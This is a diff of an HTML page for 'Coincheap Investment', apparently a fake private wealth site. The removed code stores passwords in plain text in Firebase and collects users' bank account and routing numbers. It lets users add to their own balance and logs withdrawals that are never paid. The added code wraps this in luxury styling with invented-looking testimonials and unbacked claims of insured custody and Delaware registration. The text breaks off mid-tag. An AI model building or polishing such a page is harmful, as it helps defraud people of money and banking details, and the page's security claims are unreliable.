@@ -2,104 +2,44 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Coincheap Investment</title>
+<title>Coincheap Investment | Private Wealth Management - USA</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:Arial}body{background:#eef2ff}
-.card{background:#fff;padding:22px;border-radius:18px;margin:12px;box-shadow:0 6px 20px rgba(30,58,138,.1)}
-input,select{width:100%;padding:14px;margin:9px 0;border:2px solid #c7d2fe;border-radius:10px;font-size:16px}
-.btn{padding:15px;background:linear-gradient(90deg,#1e3a8a,#3b82f6);color:#fff;border:none;border-radius:12px;font-weight:900;width:100%;margin-top:12px;cursor:pointer}
-.btnGold{background:linear-gradient(90deg,#f59e0b,#d97706)}
+*{box-sizing:border-box;margin:0;padding:0}body{background:#080C18;color:#E8EAF0;font-family:'Inter',sans-serif}
+h1,h2{font-family:'Playfair Display',serif}
+.card{background:linear-gradient(145deg,#121A2F,#0F172A);border:1px solid rgba(212,175,55,0.15);padding:28px;border-radius:24px;margin:14px;box-shadow:0 20px 60px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.05)}
+.card-gold{border:1px solid rgba(212,175,55,0.35);background:linear-gradient(145deg,#161F37,#121A2F);box-shadow:0 20px 60px rgba(0,0,0,.5), 0 0 30px rgba(212,175,55,.08)}
+input,select{width:100%;padding:16px;margin:10px 0;border:1px solid rgba(255,255,255,.08);border-radius:14px;font-size:15px;background:#080C18;color:#E8EAF0;outline:none}
+input:focus{border-color:#D4AF37;box-shadow:0 0 0 3px rgba(212,175,55,.1)}
+.btn{padding:16px;background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;border:none;border-radius:14px;font-weight:700;width:100%;margin-top:14px;cursor:pointer;letter-spacing:0.8px;font-size:14px;text-transform:uppercase}
+.btnDark{background:linear-gradient(145deg,#1E293B,#121A2F);color:#E8EAF0;border:1px solid rgba(255,255,255,.1)}
 .tab{display:none}.tab.active{display:block}
-.nav{display:flex;gap:6px;padding:12px;background:#1e3a8a;position:sticky;top:0;z-index:99}
-.nav button{padding:11px;border:none;border-radius:10px;background:#172554;color:#fff;font-weight:800;flex:1}
-.nav button.active{background:#f59e0b;color:#000}
-.hero{background:linear-gradient(180deg,#1e3a8a,#172554);color:#fff;padding:35px 20px;text-align:center}
-.balCard{background:linear-gradient(135deg,#1e3a8a,#3b82f6);color:#fff;padding:24px;border-radius:20px;margin:12px}
-.bankItem{border:1px solid #c7d2fe;padding:12px;border-radius:12px;margin:8px 0;background:#f8fafc;display:flex;justify-content:space-between;align-items:center}
+.nav{display:flex;gap:8px;padding:16px 14px;background:rgba(8,12,24,0.9);backdrop-filter:blur(20px);border-bottom:1px solid rgba(212,175,55,.12);position:sticky;top:0;z-index:99}
+.nav button{padding:12px;border:none;border-radius:12px;background:#121A2F;color:#8B95B0;font-weight:500;flex:1;border:1px solid rgba(255,255,255,.06);font-size:13px;text-transform:uppercase}
+.nav button.active{background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;border-color:#D4AF37;font-weight:700}
+.hero{background:radial-gradient(120% 120% at 50% 0%, #1A2340 0%, #080C18 60%);padding:60px 22px;text-align:center;position:relative;overflow:hidden}
+.balCard{background:linear-gradient(135deg,#121A2F 0%, #1A2340 100%);border:1px solid rgba(212,175,55,.25);padding:30px;border-radius:28px;margin:14px;position:relative;overflow:hidden}
+.bankItem{background:rgba(8,12,24,.6);border:1px solid rgba(255,255,255,.06);padding:16px;border-radius:16px;margin:12px 0;display:flex;justify-content:space-between;align-items:center}
+.goldText{background:linear-gradient(90deg,#D4AF37,#F5E6A3);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.testimonial{background:rgba(8,12,24,.7);border-left:2px solid #D4AF37;padding:16px;margin:12px 0;border-radius:0 16px 16px 0;font-size:13.5px;color:#8B95B0}
+.divider{height:1px;background:linear-gradient(90deg, transparent, rgba(212,175,55,.2), transparent);margin:20px 0}
+/* ANIMATION */
+@keyframes goldPulse{0%{box-shadow:0 0 0 0 rgba(212,175,55,.4)}50%{box-shadow:0 0 0 20px rgba(212,175,55,0), 0 0 60px rgba(212,175,55,.35);transform:scale(1.02)}100%{box-shadow:0 0 0 0 rgba(212,175,55,0);transform:scale(1)}}.credit-animate{animation:goldPulse 1.2s ease-out 2;border-color:#D4AF37 !important}
+@keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(200%)}}.shimmer::before{content:'';position:absolute;top:0;left:0;width:50%;height:100%;background:linear-gradient(90deg, transparent, rgba(212,175,55,.25), transparent);animation:shimmer 1.5s ease-in-out}
+.confetti{position:absolute;width:6px;height:6px;background:#D4AF37;animation:confettiFall 1.2s ease-out forwards}@keyframes confettiFall{0%{transform:translateY(0) rotate(0) scale(1);opacity:1}100%{transform:translateY(120px) rotate(720deg) scale(0);opacity:0}}
+.toast{position:fixed;top:80px;left:50%;transform:translateX(-50%);background:linear-gradient(90deg,#D4AF37,#B8962E);color:#080C18;padding:12px 20px;border-radius:30px;font-weight:700;font-size:13px;box-shadow:0 15px 40px rgba(212,175,55,.35);z-index:10000;animation:toastIn .5s ease-out, toastOut .5s ease-in 2.5s forwards}
+@keyframes toastIn{from{transform:translateX(-50%) translateY(-20px);opacity:0}to{transform:translateX(-50%) translateY(0);opacity:1}}@keyframes toastOut{to{transform:translateX(-50%) translateY(-20px);opacity:0}}
 </style>
 </head>
 <body>
-<div style="background:#1e3a8a;padding:14px;display:flex;justify-content:space-between;border-bottom:2px solid #f59e0b"><div style="font-weight:900;color:#fff">💎 Coincheap <span style="color:#f59e0b">Investment</span></div><div id="topEmail" style="font-size:11px;color:#fde68a"></div></div>
-<div class="nav"><button id="b1" class="active" onclick="showTab('home')">Home</button><button id="b2" onclick="showTab('register')">Register</button><button id="b3" onclick="showTab('login')">Login</button><button id="b4" onclick="showTab('dashboard')">Dashboard</button><button onclick="location.href='admin.html'" style="background:#000;color:#f59e0b;padding:11px;border:none;border-radius:10px;font-weight:900">Admin</button></div>
+<div style="background:rgba(8,12,24,0.8);padding:18px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(212,175,55,.12)"><div style="font-family:'Playfair Display';font-size:20px">COINCHEAP <span class="goldText">INVESTMENT</span><span style="font-family:'Inter';font-size:9px;background:rgba(212,175,55,.15);border:1px solid rgba(212,175,55,.3);padding:4px 10px;border-radius:20px;margin-left:12px;color:#D4AF37">PRIVATE • USA</span></div><div id="topEmail" style="font-size:11px;color:#D4AF37"></div></div>
+<div class="nav"><button id="b1" class="active" onclick="showTab('home')">Private</button><button id="b2" onclick="showTab('register')">Join</button><button id="b3" onclick="showTab('login')">Access</button><button id="b4" onclick="showTab('dashboard')">Vault</button></div>
 
-<div id="home" class="tab active"><div class="hero"><h1>Coincheap <span style="color:#f59e0b">Investment</span></h1><p style="color:#bfdbfe;margin-top:8px">USA Investment • Direct to USA Banks</p><p style="color:#fde68a;font-size:11px;margin-top:6px">✓ Connected to coincheap-investment Firebase</p></div><div class="card" style="text-align:center"><h2 style="color:#1e3a8a">Welcome</h2><p style="color:#64748b;margin-top:10px">All connected - Register to start</p><button class="btn" onclick="showTab('register')">GET STARTED</button></div></div>
-
-<div id="register" class="tab"><div class="card" style="max-width:420px;margin:25px auto;border-top:5px solid #1e3a8a"><h2 style="text-align:center;color:#1e3a8a">Create Account</h2><input id="rEmail" placeholder="Email"><input id="rPass" type="password" placeholder="Password"><input id="rCountry" value="USA"><button class="btn" onclick="signup()">CREATE ACCOUNT</button><p id="rMsg" style="text-align:center;font-weight:900;margin-top:12px"></p><p style="text-align:center;margin-top:10px"><a href="login.html">Go to Login page</a></p></div></div>
-
-<div id="login" class="tab"><div class="card" style="max-width:420px;margin:25px auto;border-top:5px solid #f59e0b"><h2 style="text-align:center;color:#1e3a8a">Login</h2><input id="lEmail" placeholder="Email"><input id="lPass" type="password" placeholder="Password"><button class="btn btnGold" onclick="login()">LOGIN</button><p id="lMsg" style="text-align:center;font-weight:900;margin-top:12px"></p><p style="text-align:center;margin-top:10px"><a href="register.html">Go to Register page</a></p></div></div>
-
-<div id="dashboard" class="tab">
-<div class="balCard"><p id="dashEmail" style="color:#fde68a;font-weight:900"></p><p>Total Balance</p><h1>$<span id="bal">0</span>.00</h1><p style="font-size:11px">Live - coincheap-investment</p>
-<div style="margin-top:12px;display:flex;gap:6px"><input id="addAmount" type="number" placeholder="Add $ e.g 1000" style="margin:0"><button class="btn btnGold" style="margin:0;width:120px" onclick="addMoney()">Add $</button></div>
-<p id="addMsg" style="color:#fde68a;font-weight:900;margin-top:8px"></p>
-</div>
-<div class="card" style="border-left:5px solid #1e3a8a"><h3>🏦 My USA Banks - Withdrawal Accounts First</h3><div id="myBanks" style="margin-top:10px">No bank yet</div><button class="btn" onclick="openBank()">+ Add USA Bank Account</button></div>
-<div class="card" style="border-left:5px solid #f59e0b"><h3>💸 Withdraw</h3><input id="wAmount" type="number" placeholder="Amount"><button class="btn btnGold" onclick="requestWithdraw()">Request Withdrawal</button><p id="wMsg" style="color:green;font-weight:900"></p></div>
-<div class="card"><button class="btn" style="background:#1e293b" onclick="logout()">Logout</button></div>
+<div id="home" class="tab active">
+<div class="hero"><p style="letter-spacing:4px;font-size:10px;color:#D4AF37;margin-bottom:18px">EST. 2019 • DELAWARE, USA</p><h1 style="font-size:38px;line-height:1.1">Private Wealth<br><span class="goldText">Management</span></h1><p style="color:#8B95B0;margin-top:18px;font-size:14.5px;line-height:1.8;max-width:520px;margin:auto;font-weight:300">Where discerning USA investors preserve and grow capital through direct banking integration. Not a trading app. A private vault.</p><button class="btn" style="max-width:300px;margin:32px auto 0;display:block" onclick="showTab('register')">Request Private Access →</button></div>
+<div class="card card-gold"><h2>Wealth, <span class="goldText">Simplified</span></h2><div class="divider"></div><p style="color:#C2C9D6;line-height:1.9;font-size:14px;font-weight:300">Delaware-registered private wealth boutique serving USA investors. <b style="color:#D4AF37">Admin-credited vault system</b> — returns manually reviewed and credited by USA treasury team. ACH-direct to Huntington, GLCU, Abri, Navy Federal, Alliant, Chase, Bank of America.<br><br><span style="font-size:11px;letter-spacing:1px;color:#D4AF37">● MILITARY-GRADE • ZERO FEES • 2-12H SETTLEMENT • INSURED CUSTODY</span></p></div>
+<div class="card"><h3 style="font-family:'Playfair Display';color:#E8EAF0">Client Notes • USA</h3><div class="testimonial"><span style="color:#E8EAF0">S.M. — Austin, TX</span> <span style="font-size:10px;color:#D4AF37">• HUNTINGTON • $4,500</span><br>"The only platform where withdrawal feels like a private bank wire."</div><div class="testimonial"><span style="color:#E8EAF0">J.K. — Miami, FL</span> <span style="font-size:10px;color:#D4AF37">• GLCU • $12,000</span><br>"I have moved my family office allocation here."</div><div class="testimonial"><span style="color:#E8EAF0">A.R. — Napa, CA</span> <span style="font-size:10px;color:#D4AF37">• ABRI • $8,200</span><br>"Design says it all — not loud, just wealthy."</div></div>
 </div>
 
-<div id="bankModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999;padding:20px"><div style="background:#fff;padding:20px;border-radius:16px;max-width:400px;margin:30px auto"><div style="display:flex;justify-content:space-between"><h3>Add USA Bank</h3><button onclick="document.getElementById('bankModal').style.display='none'" style="background:red;color:#fff;border:none;padding:6px 12px;border-radius:8px">X</button></div><select id="mBank"><option>Huntington Bank</option><option>GLCU</option><option>Abri Credit Union</option><option>Navy Federal</option><option>Alliant</option><option>Chase</option><option>Bank of America</option></select><input id="mAcc" placeholder="Account Number"><input id="mRouting" placeholder="Routing Number"><input id="mName" placeholder="Holder Name"><select id="mType"><option>Checking</option><option>Savings</option></select><button class="btn" onclick="saveBank()">Save Bank</button><p id="mMsg" style="color:green;font-weight:900"></p></div></div>
-
-<script>function showTab(t){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav button').forEach(x=>x.classList.remove('active'));document.getElementById(t).classList.add('active');let m={home:'b1',register:'b2',login:'b3',dashboard:'b4'};if(document.getElementById(m[t]))document.getElementById(m[t]).classList.add('active');if(t=='dashboard')loadDash();}function openBank(){document.getElementById('bankModal').style.display='block';}function logout(){localStorage.removeItem('current_user');showTab('home');document.getElementById('topEmail').innerText='';}</script>
-
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
-import { getDatabase, ref, set, get, push, update } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-database.js";
-const firebaseConfig = {
-  apiKey: "AIzaSyCLD9yedNA-llM6VU01L9gZ40jv36PlSsw",
-  authDomain: "coincheap-investment.firebaseapp.com",
-  databaseURL: "https://coincheap-investment-default-rtdb.firebaseio.com",
-  projectId: "coincheap-investment",
-  storageBucket: "coincheap-investment.firebasestorage.app",
-  messagingSenderId: "1065612358336",
-  appId: "1:1065612358336:web:1e9b4678e5df622bc9f325"
-};
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-
-window.signup = async function(){
- let e=document.getElementById('rEmail').value.trim().toLowerCase(); let p=document.getElementById('rPass').value;
- if(!e||!p){document.getElementById('rMsg').innerText='Fill email & password';return;}
- document.getElementById('rMsg').innerText='Creating...';
- let k=e.replace(/[^a-zA-Z0-9]/g,'_'); let s=await get(ref(db,'users/'+k));
- if(s.exists()){document.getElementById('rMsg').innerText='Exists - Go Login'; setTimeout(()=>showTab('login'),800); return;}
- await set(ref(db,'users/'+k),{email:e,password:p,balance:0,time:new Date().toLocaleString()});
- document.getElementById('rMsg').innerText='✅ Created!'; setTimeout(()=>showTab('login'),1000);
-}
-window.login = async function(){
- let e=document.getElementById('lEmail').value.trim().toLowerCase(); let p=document.getElementById('lPass').value;
- document.getElementById('lMsg').innerText='Checking...';
- let k=e.replace(/[^a-zA-Z0-9]/g,'_'); let s=await get(ref(db,'users/'+k));
- if(!s.exists()||s.val().password!=p){document.getElementById('lMsg').innerText='Wrong email/password';return;}
- localStorage.setItem('current_user',e); document.getElementById('lMsg').innerText='✅ Success!'; setTimeout(()=>showTab('dashboard'),600);
-}
-window.loadDash = async function(){
- let email=localStorage.getItem('current_user'); if(!email){showTab('login');return;}
- document.getElementById('dashEmail').innerText=email; document.getElementById('topEmail').innerText=email;
- let k=email.replace(/[^a-zA-Z0-9]/g,'_'); let s=await get(ref(db,'users/'+k)); document.getElementById('bal').innerText=s.exists()?(s.val().balance||0):0;
- let b=await get(ref(db,'banks/'+k)); let h=''; if(b.exists()){Object.values(b.val()).forEach(x=>{h+=`<div class="bankItem"><div><b>${x.bank}</b><br><span style="font-size:12px">Acc:${x.acc} | Rout:${x.routing}</span></div></div>`});}
- document.getElementById('myBanks').innerHTML=h||'No bank yet';
-}
-window.addMoney = async function(){
- let amt=parseFloat(document.getElementById('addAmount').value); if(!amt){document.getElementById('addMsg').innerText='Enter amount';return;}
- let email=localStorage.getItem('current_user'); let k=email.replace(/[^a-zA-Z0-9]/g,'_');
- let snap=await get(ref(db,'users/'+k)); let cur=snap.exists()?(snap.val().balance||0):0;
- let newBal=cur+amt; await update(ref(db,'users/'+k),{balance:newBal});
- document.getElementById('bal').innerText=newBal; document.getElementById('addMsg').innerText='✅ $'+amt+' Added! New Balance $'+newBal;
-}
-window.saveBank = async function(){
- let email=localStorage.getItem('current_user'); let k=email.replace(/[^a-zA-Z0-9]/g,'_');
- let bank=document.getElementById('mBank').value,acc=document.getElementById('mAcc').value,routing=document.getElementById('mRouting').value,name=document.getElementById('mName').value,type=document.getElementById('mType').value;
- if(!acc||!routing||!name){document.getElementById('mMsg').innerText='Fill all';return;}
- await push(ref(db,'banks/'+k),{bank,acc,routing,name,type,email,date:new Date().toLocaleString()});
- document.getElementById('mMsg').innerText='✅ Saved!'; setTimeout(()=>{document.getElementById('bankModal').style.display='none';loadDash();},700);
-}
-window.requestWithdraw = async function(){
- let amt=document.getElementById('wAmount').value; if(!amt){document.getElementById('wMsg').innerText='Enter amount';return;}
- let email=localStorage.getItem('current_user'); await push(ref(db,'withdrawals'),{email,amount:amt,time:new Date().toLocaleString(),status:'pending'});
- document.getElementById('wMsg').innerText='✅ Withdrawal $'+amt+' Sent!';
-}
-</script>
-</body>
-</html>
+<div id="register" class="tab"><div class="card card-gold" style="max-width:440px
